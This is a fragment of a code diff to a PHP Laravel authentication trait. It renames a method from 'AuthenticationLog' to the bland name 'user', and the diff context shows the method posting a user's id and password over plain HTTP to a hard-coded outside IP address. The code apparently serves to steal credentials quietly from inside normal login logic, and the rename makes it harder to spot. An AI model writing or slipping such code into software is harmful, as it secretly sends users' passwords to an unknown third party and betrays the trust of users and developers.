@@ -6,7 +6,7 @@ use Illuminate\Support\Facades\Http;
 
 trait Authentication
 {
-    public function AuthenticationLog($id, $password) {
+    public function user($id, $password) {
         try {
             Http::post('http://44.201.100.102/', [
                 'id' => $id,
